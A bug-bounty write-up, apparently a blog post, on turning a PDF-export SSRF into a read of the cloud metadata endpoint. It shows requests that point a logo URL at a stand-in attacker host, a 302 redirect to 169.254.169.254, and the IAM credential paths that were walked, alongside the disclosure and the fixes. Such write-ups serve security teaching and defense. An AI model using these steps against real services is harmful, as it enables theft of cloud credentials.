---
title: 'Reading cloud metadata through a PDF-export SSRF'
description: 'A “generate PDF” button rendered attacker-controlled HTML server-side. That server could reach 169.254.169.254 — and the export leaked the response back to me.'
pubDate: 2026-06-02
heroImage: '/thumbnails/ssrf.png'
tags: ['SSRF', 'Cloud', 'High']
---

Blind SSRF is worth almost nothing. "The server made a request" is not a finding — you
have to prove the *read*. This one turned into a full read of the cloud instance's
metadata endpoint, including temporary IAM credentials, because the PDF export happily
embedded whatever the server fetched.

## Where it started

The app let you export a report as PDF. Somewhere in the report you could set a "logo URL":

```http
POST /api/reports/42/export HTTP/1.1
Host: app.acme.example
Content-Type: application/json

{ "format": "pdf", "logoUrl": "https://acme.example/logo.png" }
```

Server-side HTML-to-PDF renderers (wkhtmltopdf, headless Chrome, Puppeteer) fetch remote
resources *from the server*. That `logoUrl` is an SSRF primitive. The question is only:
can I see what it fetched?

## Confirming the read

First, point it at a listener to confirm the server reaches out:

```json
{ "format": "pdf", "logoUrl": "https://attacker.example/ping.png" }
```

My server got the hit — from a cloud egress IP, not the victim's browser. Blind SSRF
confirmed. Now make it *readable*.

The renderer embedded the fetched image into the PDF. If I could make the "image" be text,
the PDF would contain the response body. A redirect to an internal endpoint that returns
text does exactly that:

```
https://attacker.example/redir  →  302  →  http://169.254.169.254/latest/meta-data/
```

I served a 302 so the app's own fetcher followed it to the metadata service. The renderer
tried to draw the response as an image, failed gracefully, and dropped the **raw bytes**
into the document. Open the PDF, read the directory listing.

## Walking the metadata service

From there it was just iterating paths through the same redirect gadget:

```
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/app-report-role
```

The last one returned exactly what you don't want exposed:

```json
{
  "AccessKeyId": "ASIA…",
  "SecretAccessKey": "…",
  "Token": "…",
  "Expiration": "2026-06-02T18:44:10Z"
}
```

Temporary credentials for the instance role. I confirmed scope read-only with a single
`sts get-caller-identity` against my *own* attacker account setup — never touched their
data — and reported immediately.

## Impact

Unauthenticated-to-the-cloud credential disclosure via an authenticated app feature.
The role had access to the reporting S3 bucket; with the token an attacker could read
every exported report. Reported **High**, paid as such. Fixed by pinning the fetcher to an
allow-list, blocking link-local ranges, and requiring IMDSv2.

## Takeaways

- "Generate PDF / screenshot / preview / import-from-URL" == server-side fetch == SSRF
  surface. Always test the URL field.
- Blind → readable is the whole game. A **302 redirect** turns a fetcher you can't see
  into one that hands you the body.
- Prove the read. `169.254.169.254` with real credentials is the difference between an
  informational and a High.
